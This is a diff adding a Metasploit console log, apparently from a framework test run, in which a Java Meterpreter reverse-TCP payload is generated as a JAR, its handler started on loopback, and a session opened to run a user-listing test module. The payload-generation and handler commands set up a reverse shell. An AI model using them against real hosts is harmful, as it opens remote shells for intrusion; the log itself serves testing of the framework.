@@ -1,0 +1,29 @@
+use java/meterpreter/reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/javameterpreterreverse_tcp_session_tlv_logging20231026-4729-xgcx3ttxt
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-java-meterpreter-reverse-tcp20231026-4729-wz9oxj.jar -f jar AutoVerifySessionTimeout=30 lport=6003 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/javameterpreterreverse_tcp_debug_log20231026-4729-hy7ku7txt spawn=0
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> SessionTlvLogging => file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/javameterpreterreverse_tcp_session_tlv_logging20231026-4729-xgcx3ttxt
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> [*] Writing 5259 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-java-meterpreter-reverse-tcp20231026-4729-wz9oxj.jar...
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 2
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6003 
+[*] Sending stage (57692 bytes) to 127.0.0.1
+[*] Meterpreter session 3 opened (127.0.0.1:6003 -> 127.0.0.1:49778) at 2023-10-26 19:03:53 +0000
+use test/unix
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> run session=3 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod
+[*] Running against session 3
+[*] Session type is meterpreter and platform is osx
+[+] should list users
+[*] Testing complete in 0.04 seconds
+[*] Passed: 1; Failed: 0; Skipped: 0
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 3 closed.
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> 
